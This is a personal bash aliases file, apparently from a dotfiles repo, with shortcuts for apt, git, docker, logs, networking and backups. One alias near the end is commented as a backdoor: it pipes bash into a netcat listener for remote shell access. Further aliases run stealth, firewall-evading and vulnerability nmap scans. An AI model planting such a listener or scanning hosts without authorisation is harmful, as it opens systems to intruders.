#!/bin/bash
# https://github.com/voku/dotfiles


# ------------------------------------------------------------------------------
# | Defaults                                                                   |
# ------------------------------------------------------------------------------
alias scriptinfo="grep -E '^[[:space:]]*([[:alnum:]_]+[[:space:]]*\(\)|function[[:space:]]+[[:alnum:]_]+)'"

alias c="cheat "
alias cl="cheat -l"
alias a="alias | grep "
alias f="scriptInfoPerl | grep "
alias s="saveHome"
alias l="loadHome"
alias keyboardDE="setxkbmap -layout de"

# reload the shell (i.e. invoke as a login shell)
alias reload='exec "$SHELL" -l'
#alias load='source ~/.bashrc && source ~/.dot/.bash_aliases && source ~/.dot/.bash_functions.sh'
alias load='source "$HOME"/.bashrc && source $HOME/.dot/.bash_aliases && source $HOME/.dot/.bash_functions.sh && homeshick link'

alias logs_multi_all="multitail --mergeall /var/log/*log --no-mergeall"
alias logs_lnav_all="lnav /var/log"
alias logsTelegraf="lnav /var/log/telegraf/telegraf.log "
alias logsGrafana="lnav /var/log/grafana/grafana.log"
alias logsInflux="lnav /var/log/influxdb/influxdb.log"
alias logsApache="lnav /var/log/apache2/"
alias logsMysql="lnav /var/log/mysql/"
alias logsMongodb="lnav /var/log/mongodb/"
alias logsNeo4j="lnav /var/log/neo4j/"
alias logsNginx="lnav /var/log/nginx/"
alias logsPlesk-php73-fpm="lnav /var/log/plesk-php73-fpm/"
alias logsWWW="lnav /var/www/vhosts/knaak.org/logs/"

alias zabbix_server_reload="zabbix_server -R config_cache_reload"
# ------------------------------------------------------------------------------
# | sudo                                                                       |
# ------------------------------------------------------------------------------

# Enable simple aliases to be sudo'ed. ("sudone"?)
alias sudo='sudo '
alias joe='joe -nodeadjoe -nobackups -noexmsg '
alias vi='joe'
alias hmm='apropos '

# ------------------------------------------------------------------------------

alias mkdir="mkdir -p"
alias md="mkdir"
alias rmd='rm -r'
alias rd="rmdir"
# create a dir with date from today
alias mkdd='mkdir $(date +%Y%m%d)'
alias linuxversion="lsb_release -a"


# ------------------------------------------------------------------------------
# | Global Quick Commands                                                      |
# ------------------------------------------------------------------------------

alias tarx='tar xfv'
alias e='extract'
alias editAlias="joe ~/.dot/.bash_aliases"
alias editFunctions="joe ~/.dot/.bash_functions.sh"
alias editBash='joe ~/.bashrc'

alias cf='grep ^[^#]'
alias nodels='pm2 ls'

alias py3='python3'
alias py='py3'
alias p3='py3'
alias p='python'

alias cx="chmod +x "
alias bd=". bd -s"

# Easier navigation: .., ..., ...., ....., ~ and -
alias ..="cd .."
alias ...="cd ../.."
alias ....="cd ../../.."
alias .....="cd ../../../.."
alias ~="cd ~"       # `cd` is probably faster to type though
alias -- -="cd -"

# fallback by typo
alias cd..='cd ..'
alias cd...='cd ../..'
alias cd....='cd ../../..'
alias cd.....='cd ../../../..'
alias cdHomeshick="homeshick cd dotfiles"

alias ll='ls -alF'
alias la='ls -A'


alias dir='ls -la'
alias d='ls -l'
alias da='ls -la'
alias dd='ls -d */'

# ls replacement with exa
if command -v exa >/dev/null; then
  alias d='exa --long --header --git -g'
  alias da='exa --long --header --git -g -all'
  alias dt='exa --long --header --git -T -g'
  alias dd='exa --long --header --git -d */'
fi

alias user-ls='cat /etc/passwd'
alias groups-ls="getent group"

# Print each PATH entry on a separate line
alias path='echo -e ${PATH//:/\\n}'

alias cd_Aptlist='cd /etc/apt/'
alias cd_git='cd "$HOME"/git'
alias cd_Scripts='cd $HOME/git/scripts'

alias ssdn='sudo shutdown now'
alias ssrn='sudo reboot now'

# ------------------------------------------------------------------------------
# | Search and Find                                                            |
# ------------------------------------------------------------------------------

# super-grep ;)
alias sgrep='grep -R -n -H -C 5 --exclude-dir={.git,.svn,CVS} '

# search in files (with fallback)
if command ack-grep >/dev/null 2>&1; then
  alias ack="ack-grep"
  alias afind="ack-grep -iH"
else
  alias afind="ack -iH"
fi

alias findLastFile="find . -type f -printf \"%T@ %p\n\" | sort -n | cut -d' ' -f 2- | tail -n 1 | xargs -d'\n' ls -la"

# ------------------------------------------------------------------------------
# | services                                                                   |
# ------------------------------------------------------------------------------


alias list_services="service --status-all "
alias list_services_startup="systemctl list-units --type service"
alias list_services_all="systemctl list-units --type service --all"
alias list_services_tree="systemctl list-dependencies --type service"
alias list_services_locate="locate "
alias list_PortsLocalhostNmap="sudo nmap -T4 -v 127.0.0.1"
alias list_PortsLocalhostLsof="sudo lsof -Pnl +M -i4"

alias check_servic_isActive="systemctl is-active "
alias check_servic_isActive_onBoot="systemctl is-enabled "
alias disable_mask_service="systemctl mask "
alias disable_service="systemctl enable "
alias enable_service="systemctl enable "


# ------------------------------------------------------------------------------
# | Apt                                                                        |
# ------------------------------------------------------------------------------

alias ap='sudo apt-get install'
alias apr='sudo apt-get remove'
alias apAutoremove='sudo apt-get autoremove ' #with Deps
alias apNoUpdate='sudo apt-get install --no-upgrade '
alias apPurge='sudo apt-get purge '
alias apRemovePurge='sudo apt-get remove --purge '
alias apClean='sudo apt-get clean'
alias apSource='sudo apt-get --download-only source '
alias apSourceCompile='sudo apt-get --compile source '
alias apDownload='sudo apt-get download '
alias apChangelog='sudo apt-get changelog '
alias apBuildDep='sudo apt-get build-dep '
alias apCheck='sudo apt-get check '
alias apAutoclean='sudo apt-get autoclean '
alias apSearch='sudo apt-cache search '
alias apuu='sudo apt-get update && sudo apt-get -y upgrade'
alias aptGetVersion="dpkg -l | grep -i "
alias aptList="dpkg -l"
alias aptReconf="dpkg-reconfigure "
alias aptListAll_names="dpkg -l |awk '/^[hi]i/{print $2}' "
alias aptListAll_Path="apt list --installed"
#alias aptChangelog="xargs -I% -- zless /usr/share/doc/%/changelog.Debian.gz <<<"
alias aptListSources="apt-cache policy | grep http | awk '{print $2 $3}' | sort -u "
alias aptChangelog="aptitude changelog "
alias aptListSourcesList="cat /etc/apt/sources.list"
alias aptEditSourcesList="sudo joe /etc/apt/sources.list"
alias aptListSourcesD="ls -la /etc/apt/sources.list.d/"
alias aptSourcesSize="aptitude -O installsize -F'%p %I' search '~i'"
alias aptgetAppInfos_fromthis="apt-cache policy "


# ------------------------------------------------------------------------------
# | php                                                                        |
# ------------------------------------------------------------------------------

alias listLoadedPhpInis7="php --ini"
alias listLoadedPhpInis73="php73 --ini"
alias phplint='find . -name "*.php" -exec php -l {} \; | grep "Parse error"'

# ------------------------------------------------------------------------------
# | git                                                                        |
# ------------------------------------------------------------------------------
alias gitp='git push origin master'
alias gitsub='git submodule add'
alias gitsubadd='git submodule add'
alias gitsubget='git submodule init && git submodule update'
alias gitadd="git add * && git commit -m "
alias gc="git clone "

alias prettyGitLog="git log --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)<%an>%Creset' --abbrev-commit"
# git config --global alias.lg "log --color --graph --pretty=format:'%C(#dc322f)%h%C(#b58900)%d %C(#eee8d5)%s %C(#dc322f)| %C(#586f75)%cr %C(#dc322f)| %C(#586e75)%an%Creset' --abbrev-commit"
alias prettyGitLog_clean=" --format='%Cred%h%Creset %s %Cgreen(%cr) %C(blue)<%an>%Creset%C(yellow)%d%Creset' --no-merges"

#git clone -b <branch> <remote_repo>
#Example:
#git clone -b develop git@github.com:user/myproject.git

alias createGitChangelog="git log v2.1.0...v2.1.1 --pretty=format:'<li> <a href=\"https://github.com/corgan2222/dotfiles/commit/%H\">view commit &bull;</a> %s</li> ' --reverse | grep \"#changelog\""
#https://jerel.co/blog/2011/07/generating-a-project-changelog-using-git-log

alias map="xargs -n1"
#find * -name models.py | map dirname
#core

alias makescript="fc -rnl | head -1 >" #Easily make a script out of the last command you ran: makescript [script.sh]

# ------------------------------------------------------------------------------
# | Network                                                                    |
# ------------------------------------------------------------------------------
alias wget='wget -c'
alias checkport_lsof='lsof -i '


alias ports="netstat -lnpt4e | grep -w 'LISTEN'"
alias portsu="netstat -lnp"

# external ip address
alias myip_dns="dig +short myip.opendns.com @resolver1.opendns.com"
alias myip_http="curl http://ipecho.net/plain && echo"

alias ping='ping -c 5'
# Do not wait interval 1 second, go fast #
alias fastping='ping -c 100 -s.2'

# Gzip-enabled `curl`
alias gurl="curl --compressed"

# displays the ports that use the applications
alias lsport='sudo lsof -i -T -n'
alias listen="lsof -P -i -n" 

# shows more about the ports on which the applications use
alias llport='netstat -nape --inet --inet6'

# show only active network listeners
alias netlisteners='sudo lsof -i -P | grep LISTEN'

 #also pass it via sudo so whoever is admin can reload it without calling yo
alias nginxreload='sudo /usr/local/nginx/sbin/nginx -s reload'
alias nginxtest='sudo /usr/local/nginx/sbin/nginx -t'
alias lightyload='sudo /etc/init.d/lighttpd reload'
alias lightytest='sudo /usr/sbin/lighttpd -f /etc/lighttpd/lighttpd.conf -t'
alias httpdreload='sudo /usr/sbin/apachectl -k graceful'
alias httpdtest='sudo /usr/sbin/apachectl -t && /usr/sbin/apachectl -t -D DUMP_VHOSTS'

alias interfaces_IP="ifconfig | grep 'inet addr:' | awk {'print $2'}  | grep -v '127.0.0.1' | sed -e 's/addr://'"
alias interfaces_IP2="ip addr | grep 'inet ' | sed 's/^ //g' | grep -v '127.0.0.1'"                    
#alias interfaces_IP3="ifconfig | awk -v RS=\"\n\n\" '{ for (i=1; i<=NF; i++) if ($i == \"inet\" && $(i+1) ~ /^addr:/) address = substr($(i+1), 6); if (address != \"127.0.0.1\") printf \"%s\t%s\n\", $1, address }'"
alias routesIP="ip route show"
alias metricsIP="ip -statistics link show"


# ------------------------------------------------------------------------------
# | Date & Time                                                                |
# ------------------------------------------------------------------------------

# date
alias date_iso_8601='date "+%Y%m%dT%H%M%S"'
alias date_clean='date "+%Y-%m-%d"'
alias date_year='date "+%Y"'
alias date_month='date "+%m"'
alias date_week='date "+%V"'
alias date_day='date "+%d"'
alias date_hour='date "+%H"'
alias date_minute='date "+%M"'
alias date_second='date "+%S"'
alias date_time='date "+%H:%M:%S"'
alias setTimeZone="sudo dpkg-reconfigure tzdata"

# stopwatch
alias timer='echo "Timer started. Stop with Ctrl-D." && date && time cat && date'


# ------------------------------------------------------------------------------
# | Hard- & Software Infos                                                     |
# ------------------------------------------------------------------------------

# pass options to free
alias meminfo="free -m -l -t"

alias ps="ps aux | grep" #Easily find the PID of any process: ps? [name]

# get top process eating memory
alias psmem="ps -o time,ppid,pid,nice,pcpu,pmem,user,comm -A | sort -n -k 6"
alias psmem5="psmem | tail -5"
alias psmem10="psmem | tail -10"

# get top process eating cpu
alias pscpu="ps -o time,ppid,pid,nice,pcpu,pmem,user,comm -A | sort -n -k 5"
alias pscpu5="pscpu | tail -5"
alias pscpu10="pscpu | tail -10"

# shows the corresponding process to ...
alias psx="ps auxwf | grep "

## Get server cpu info ##
if command -v lscpu >/dev/null; then
  # older system use /proc/cpuinfo ##
  alias cpuinfo='less /proc/cpuinfo' ##
else
  alias cpuinfo='lscpu'
fi  

## get GPU ram on desktop / laptop##
alias gpumeminfo='grep -i --color memory /var/log/Xorg.0.log'

#kill all process with name
alias psKillAll="pkill -f "

# shows the process structure to clearly
alias pst="pstree -Alpha"

# shows all your processes
alias psmy='ps -ef | grep $USER'

# the load-avg
alias loadavg="cat /proc/loadavg"

# show all partitions
alias partitions="cat /proc/partitions"

# shows the disk usage of a directory legibly
alias du="du -kh"
alias du5="du -kh | tail -5"
alias du10="du -kh | tail -10"

# show the biggest files in a folder first
alias du_overview='du -h | grep "^[0-9,]*[MG]" | sort -hr | less'

# shows the complete disk usage to legibly
alias df="df -kTh"



alias renameImagaExif="exiftool '-filename<DateTimeOriginal' -d %Y-%m-%d_%H-%M-%S%%-c.%%le ."

# ------------------------------------------------------------------------------
# | System Utilities                                                           |
# ------------------------------------------------------------------------------

# becoming root + executing last command
alias sulast="su -c !-1 root"
alias mountc='mount |column -t'
alias mountMedien='mount.cifs -v -o username=admin //serva3/Medien /mnt/mountMedia/'
alias devList="sudo blkid -o list -w /dev/null"
alias helpMount=" 
AT32
sudo mount -t vfat -o utf8,uid=pi,gid=pi,noatime /dev/sda /media/usbstick

NTFS
sudo mount -t ntfs-3g -o utf8,uid=pi,gid=pi,noatime /dev/sda /media/usbstick

HFS+
sudo mount -t hfsplus -o utf8,uid=pi,gid=pi,noatime /dev/sda /media/usbstick

exFAT
sudo mount -t exfat -o utf8,uid=pi,gid=pi,noatime /dev/sda /media/usbstick

ext4
sudo mount -t ext4 -o defaults /dev/sda /media/usbstick
"

# ------------------------------------------------------------------------------
# | Other                                                                      |
# ------------------------------------------------------------------------------

# decimal to hexadecimal value
alias dec2hex="printf "%x\n" $1"

# Canonical hex dump; some systems have this symlinked
command -v hd > /dev/null || alias hd="hexdump -C"

# urldecode - url http network decode
alias urldecode='python -c import sys, urllib as ul; print ul.unquote_plus(sys.argv[1])"'

# urlencode - url encode network http

# ROT13-encode text. Works for decoding, too! ;)
alias rot13='tr a-zA-Z n-za-mN-ZA-M'

# intuitive map function
#
# For example, to list all directories that contain a certain file:
# find . -name .gitattributes | map dirname
alias map="xargs -n1"

#### Validators
alias yamlcheck='yamllint '
alias jsoncheck='jq "." >/dev/null <'
alias xmlcheck='xmlstarlet val '

#### Characters
alias ascii_='man ascii | grep -m 1 -A 63 --color=never Oct'
alias alphabet_='echo a b c d e f g h i j k l m n o p q r s t u v w x y z'
alias unicode_='echo ✓ ™  ♪ ♫ ☃ ° Ɵ ∫'
alias numalphabet_='xxalphabet; echo 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6'

#### Regular Expressions
alias regxmac='echo [0-9a-f]{2}:[0-9a-f]'
alias regxip="echo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'"
alias regxemail='echo "[^[:space:]]+@[^[:space:]]+"'

alias histg="history | grep" #To quickly search through your command history: histg [keyword]

# tree (with fallback)
if command tree >/dev/null 2>&1; then
  # displays a directory tree
  alias tree="tree -Csu"
  # displays a directory tree - paginated
  alias ltree="tree -Csu | less -R"
else
  alias tree="find . -print | sed -e 's;[^/]*/;|____;g;s;____|; |;g'"
  alias ltree="tree | less -R"
fi


# ------------------------------------------------------------------------------
# | Fun                                                                        |
# ------------------------------------------------------------------------------

#alias nyancat="telnet miku.acm.uiuc.edu"  # offline
alias starwars="telnet towel.blinkenlights.nl"


[[ -s "/etc/grc.bashrc" ]] && source /etc/grc.bashrc

 # Use GRC for additionnal colorization
  if command grc >/dev/null 2>&1; then
    alias colour="grc -es --colour=auto"
    alias as="colour as"
    alias configure="colour ./configure"
    alias diff="colour diff"
    alias dig="colour dig"
    alias g++="colour g++"
    alias gas="colour gas"
    alias gcc="colour gcc"
    alias head="colour head"
    alias ifconfig="colour ifconfig"
    alias ld="colour ld"
    alias ls="colour ls"
    alias make="colour make"
    alias mount="colour mount"
    alias netstat="colour netstat"
    alias ping="colour ping"
    alias ps="colour ps"
    alias tail="colour tail"
    alias traceroute="colour traceroute"
    alias syslog="sudo colour tail -f -n 100 /var/log/syslog"
  fi

  alias pretty=" python -m json.tool"


# ------------------------------------------------------------------------------
# | backup                                                                     |
# ------------------------------------------------------------------------------

  # if cron fails or if you want backup on demand just run these commands #
# again pass it via sudo so whoever is in admin group can start the job #
# Backup scripts #
alias backup='sudo /home/scripts/admin/scripts/backup/wrapper.backup.sh --type local --taget /raid1/backups'
alias nasbackup='sudo /home/scripts/admin/scripts/backup/wrapper.backup.sh --type nas --target nas01'
alias s3backup='sudo /home/scripts/admin/scripts/backup/wrapper.backup.sh --type nas --target nas01 --auth /home/scripts/admin/.authdata/amazon.keys'
alias rsnapshothourly='sudo /home/scripts/admin/scripts/backup/wrapper.rsnapshot.sh --type remote --target nas03 --auth /home/scripts/admin/.authdata/ssh.keys --config /home/scripts/admin/scripts/backup/config/adsl.conf'
alias rsnapshotdaily='sudo  /home/scripts/admin/scripts/backup/wrapper.rsnapshot.sh --type remote --target nas03 --auth /home/scripts/admin/.authdata/ssh.keys  --config /home/scripts/admin/scripts/backup/config/adsl.conf'
alias rsnapshotweekly='sudo /home/scripts/admin/scripts/backup/wrapper.rsnapshot.sh --type remote --target nas03 --auth /home/scripts/admin/.authdata/ssh.keys  --config /home/scripts/admin/scripts/backup/config/adsl.conf'
alias rsnapshotmonthly='sudo /home/scripts/admin/scripts/backup/wrapper.rsnapshot.sh --type remote --target nas03 --auth /home/scripts/admin/.authdata/ssh.keys  --config /home/scripts/admin/scripts/backup/config/adsl.conf'
alias amazonbackup=s3backup


# ------------------------------------------------------------------------------
# | Memcache                                                                   |
# ------------------------------------------------------------------------------

## Memcached server status  ##
alias mcdstats='/usr/bin/memcached-tool 127.0.0.1:11211 stats'
alias mcdshow='/usr/bin/memcached-tool 127.0.0.1:11211 display'

## quickly flush out memcached server ##
alias flushmcd='echo "flush_all" | nc 127.0.0.1 11211'

# ------------------------------------------------------------------------------
# | #apache Ubuntu 16                                                          |
# ------------------------------------------------------------------------------

alias apacheModsAvailable="ls -l /etc/apache2/mods-available/"
alias apacheModsEnabled="ls -l /etc/apache2/mods-enabled/"
alias restartApachePhp="service apache2 restart" 
alias restartPhp73fpm="service plesk-php73-fpm restart"


# enable color support of ls and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    alias ls='ls --color=auto'   
    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
fi

[[ -s "/etc/grc.bashrc" ]] && source /etc/grc.bashrc

 # Use GRC for additionnal colorization
  if which grc >/dev/null 2>&1; then
    alias colour="grc -es --colour=auto"
    alias as="colour as"
    alias configure="colour ./configure"
    alias diff="colour diff"
    alias dig="colour dig"
    alias g++="colour g++"
    alias gas="colour gas"
    alias gcc="colour gcc"
    alias head="colour head"
    alias ifconfig="colour ifconfig"
    alias ld="colour ld"
    alias ls="colour ls"
    alias make="colour make"
    alias mount="colour mount"
    alias netstat="colour netstat"
    alias ping="colour ping"
    alias ps="colour ps"
    alias tail="colour tail"
    alias traceroute="colour traceroute"
    alias syslog="sudo colour tail -f -n 100 /var/log/syslog"
  fi

    # Use "colordiff" or "highlight" to colour diffs.
  if command -v colordiff > /dev/null; then
    alias difflight="colordiff"
  elif command -v highlight > /dev/null; then
    alias difflight="highlight --dark-red ^-.* \
      | highlight --dark-green ^+.* \
      | highlight --yellow ^Only.* \
      | highlight --yellow ^Files.*differ$ \
      | less -XFIRd"
  else
    alias difflight="less -XFIRd"
  fi

  alias debianSynoStart="chroot \"/volume1/@appstore/debian-chroot/var/chroottarget\" \"/bin/bash\""
  alias grafanaListDashboards="cd $HOME/wizzy/grafana-entities && wizzy list dashboards"
  alias grafanaImportDashbaord="$HOME/wizzy/grafana-entities && wizzy import dashboards"

# ------------------------------------------------------------------------------
# | #apache Ubuntu 16                                                          |
# ------------------------------------------------------------------------------

  alias convert_CR2_to_JPG='for i in *.CR2; do ufraw-batch $i --out-type=jpeg --output JPG/$i.jpg; done;'
  
   
###################
# Docker shortcuts
###################

# list running containers
alias dl='docker ps'

# restart docker
alias dr='docker restart'

# list ContainerSize
alias dockerContainerSize='docker stats --no-stream $(docker ps --format "{{.Names}}") | sed "s/\.[0-9]*\([kGM]i*B \)/\1/" | sort -h -k 4'

# prunes docker
alias docker_prune_system="docker system prune"

# prunes docker with volumes
alias docker_prune_system_withVolumes="docker system prune -a --volumes"
 
# list all images
alias docker_list_images='docker images'
 
# list running containers (image instances)
alias docker_process_list='docker ps -a'
 
# kill all running container processes:
alias docker_kill_all_contailer='(docker ps -q | xargs --no-run-if-empty docker kill) && docker container prune -f'
 
# remove all containers
alias docker_rm_all_container='docker ps -aq | xargs --no-run-if-empty docker rm -v'
 
# remove all docker images
alias docker_rm_all_images='docker images -aq | xargs --no-run-if-empty docker rmi -f'
 
# list all volumes
alias docker_list_volumes='docker volume ls'
 
# list all orphaned volumes
alias docker_list_orphaned_volumes='docker volume ls -f dangling=true'
 
# remove all docker volumes 
alias docker_rm_all_volumes='docker volume ls -q | xargs --no-run-if-empty docker volume rm'
 
# remove all orphaned docker volumes 
alias docker_rm_all_orphaned_volumes='docker volume ls -qf dangling=true | xargs --no-run-if-empty docker volume rm'

#show all container with internal IP 
alias docker_net_info='sudo docker ps -q | xargs -n 1 sudo docker inspect --format "{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}} {{ .Name }}" | sed "s/ \// /"'


###########################
# Docker Compose shortcuts
###########################
 
# docker compose (assumes current directory contains the docker-compose.yml)
alias dc='docker-compose '
 
# start docker stack defined by docker-compose.yml as deamon
alias dcupd='docker-compose up -d'

# start docker stack defined by docker-compose.yml
alias dcup='docker-compose up '
 
# stop docker stack defined by docker-compose.yml
alias dcdn='docker-compose down'
 
# rebuild docker stack
alias dcb='docker-compose up -d --build'
 
# watch logs in docker stack
alias dcl='watch -n2 "docker-compose logs | tail -f"'

# watch logs in docker stack
alias dcp='docker-compose pull'


###########################
# VNC shortcuts
###########################

alias vncServerStop="vncserver -kill :1"
alias vncServerStart="vncserver -geometry 1920x1080 -depth 16 -name raspi4 :1"
alias vncServerStatus="sudo ps -ef | grep vnc"
alias vncServerPW="vncpasswd"

alias install_zerotiert="curl -s https://install.zerotier.com/ | sudo bash"
alias ListShellandEnvironmentVariables="printenv "

alias fx="fx ." #npm install -g fx print json
alias how="function hdi(){ howdoi $* -c -n 5; }; hdi" #pip install howdoi

#wifi
alias wifi_ls_controller="lspci"
alias wifi_show_infos="iwconfig wlan0"
alias wifi_show_quality="iwconfig wlan0 | grep -i --color quality"
alias wifi_show_quality2="cat /proc/net/wireless"
alias wifi_show_quality_continuosly="watch -n 1 cat /proc/net/wireless"
alias wifi_show_quality_continuosly_wavemon="sudo wavemon"

#journalctl 
alias journal_show_errors="journalctl -p err -b "
alias journal_show_thisunit="journalctl -u  "
alias journal_show_live_from="journalctl -f -u "
alias journal_show_live="journalctl -f"

#logrotate
alias logrotateTest="echo 'logrotate -d /etc/logrotate.d/remote-hosts'"
alias logrotateTestThis="logrotate -d "
alias logrotateDoThis="logrotate -f "

#fail2ban
alias fail2ban-client-status="fail2ban-client status"
alias fail2ban-client-getBlockedIP_all='iptables -L -n | awk '\''$1=="REJECT" && $4!="0.0.0.0/0" {print $4}'\'''
alias fail2ban-client-status_all="fail2ban-client status | sed -n 's/,//g;s/.*Jail list://p' | xargs -n1 fail2ban-client status"
alias fail2ban-client-status_this="fail2ban-client status"
alias fail2ban-test_ssh="fail2ban-regex /var/log/auth.log /etc/fail2ban/filter.d/sshd.conf && echo 'from#fail2ban-regex /var/log/auth.log /etc/fail2ban/filter.d/sshd.conf'"
alias fail2ban-test_postfix="fail2ban-regex --print-all-missed /var/log/mail.log /etc/fail2ban/filter.d/sendmail.conf /etc/fail2ban/filter.d/sendmail.conf | less && echo 'from#fail2ban-regex --print-all-missed /var/log/mail.log /etc/fail2ban/filter.d/sendmail.conf /etc/fail2ban/filter.d/sendmail.conf | less'"

#mail
#alias graylistCheckDomains="for i in `mysql -uadmin -p\`cat /etc/psa/.psa.shadow\` psa -Ns -e \"select name from domains\"`; do /usr/local/psa/bin/grey_listing --info-domain $i; done"
alias graylistCheck='	sqlite3 /var/lib/plesk/mail/greylist/settings.db "select * from remote_domains"'
alias graylistServerinfo="/usr/local/psa/bin/grey_listing --info-server"

alias checkIP="iptables --list -n"
alias restartXserver="sudo systemctl restart display-manager"

#ffmpeg 

#silent
alias ffmpegs="ffmpeg -loglevel error -hide_banner "

#Display options specific to, and information about, a particular muxer:
alias ffm_muxerInfo="ffmpeg -h muxer="

#Display options specific to, and information about, a particular demuxer:
alias ffm_demuxerInfo="ffmpeg -h demuxer="

#List all formats:
alias ffm_listFormats="ffmpeg -formats"

#List all codecs:
alias ffm_listCodecs="ffmpeg -codecs"
alias ffm_listCodecsH264="ffmpeg -loglevel error -hide_banner -codecs | grep 264"
alias ffm_listCodecsH265="ffmpeg -loglevel error -hide_banner -codecs | grep 265"

#List all encoders:
alias ffm_listEncoders="ffmpeg -encoders"

#List all decoders:
alias ffm_listDecoders="ffmpeg -decoders"

#Display options specific to, and information about, a particular encoder:
alias ffm_DetailsEncoderThis="ffmpeg -loglevel error -hide_banner -h encoder="

#Display options specific to, and information about, a particular decoder:
alias ffm_DetailsDecoderThis="ffmpeg -loglevel error -hide_banner -h decoder="

#lists all functions registerd in bash
alias list_functions='shopt -s extdebug;declare -F | grep -v "declare -f _" | declare -F $(awk "{print $3}") | column -t;shopt -u extdebug' 

#top for files
alias topFiles="watch -d -n 2 'df; ls -FlAt;'"

 
#Create a b@ckd00r on a machine to allow remote connection to bash
#This will launch a listener on the machine that will wait for a connection on port 1234. 
#When you connect from a remote machine with something like : 
#nc 192.168.0.1 1234 You will have console access to the machine through bash. 
alias backd="/bin/bash | nc -l 1234"

# Quick and dirty hardware summary where lshw is not available. Requires util-linux, procps, pciutils, usbutils and net-tools, which should be preinstalled on most systems. 
alias gethw='(printf "\nCPU\n\n"; lscpu; printf "\nMEMORY\n\n"; free -h; printf "\nDISKS\n\n"; lsblk; printf "\nPCI\n\n"; lspci; printf "\nUSB\n\n"; lsusb; printf "\nNETWORK\n\n"; ifconfig) | less'

#python
alias py_createVirt="python3 -m venv env"
alias pi="pip3 install"
alias pf="pip3 freeze"
alias pr="pip3 install -r requirements.txt"

#nmap
#scan for open ports on target.
alias nmap_open_ports="sudo nmap --open"

# list all network interfaces on host where the command runs.
alias nmap_list_interfaces="sudo nmap --iflist"

#slow scan that avoids to spam the targets logs.
alias nmap_slow="sudo nmap -sS -v -T1"

# scan to see if hosts are up with TCP FIN scan.
alias nmap_scanIP="sudo nmap -sF -v"

#aggressive full scan that scans all ports, tries to determine OS and service versions.
alias nmap_full="sudo nmap -sS -T4 -PE -PP -PS80,443 -PY -g 53 -A -p1-65535 -v"

#TCP ACK scan to check for firewall existence.
alias nmap_check_for_firewall="sudo nmap -sA -p1-65535 -v -T4"

#host discovery with SYN and ACK probes instead of just pings to avoid firewall restrictions.
alias nmap_ping_through_firewall="nmap -PS -PA"

#fast scan of the top 300 popular ports.
alias nmap_fast="sudo nmap -F -T5 --version-light --top-ports 300"

#detects versions of services and OS, runs on all ports.
alias nmap_detect_versions="sudo nmap -sV -p1-65535 -O --osscan-guess -T4 -Pn"

#uses vulscan script to check target services for vulnerabilities.
alias nmap_check_for_vulns="sudo nmap --script=vuln"

#same as full but via UDP
alias nmap_full_udp="sudo nmap -sS -sU -T4 -A -v -PE -PS22,25,80 -PA21,23,80,443,3389 "

#try to traceroute using the most common ports.
alias nmap_traceroute="sudo nmap -sP -PE -PS22,25,80 -PA21,23,80,3389 -PU -PO --traceroute "

#same as nmap_full but also runs all the scripts.
alias nmap_full_with_scripts="sudo nmap -sS -sU -T4 -A -v -PE -PP -PS21,22,23,25,80,113,31339 -PA80,113,443,10042 -PO --script all "

#ittle "safer" scan for OS version as connecting to only HTTP and HTTPS ports doesn't look so attacking.
alias nmap_web_safe_osscan="sudo nmap -p 80,443 -O -v --osscan-guess --fuzzy "

#ICMP scan for active hosts
alias nmap_ping_scan="sudo nmap -n -sP"

#OS-Scan
alias nmap_scanIP_os="sudo nmap -O "

#OS & Service Scan
alias nmap_scanIP_osService="sudo nmap -A "

# find all active IP addresses in a network
alias nmap_scanNetwork="scanNetwork_nmap"

#Host-Discovery mit ARP
alias scanNetwork_arp="arp -a"

#Host-Discovery mit ARP-scan
alias scanNetwork_arpScan="arp-scan --localnet"

#influx get infos about the hdd size per measurment
alias influx_hdd_measurment="sudo influx_inspect report-disk -detailed /data/var/lib/influxdb/ "
alias influx_hdd_measurment_save="sudo influx_inspect report-disk -detailed /data/var/lib/influxdb/ > data.json "
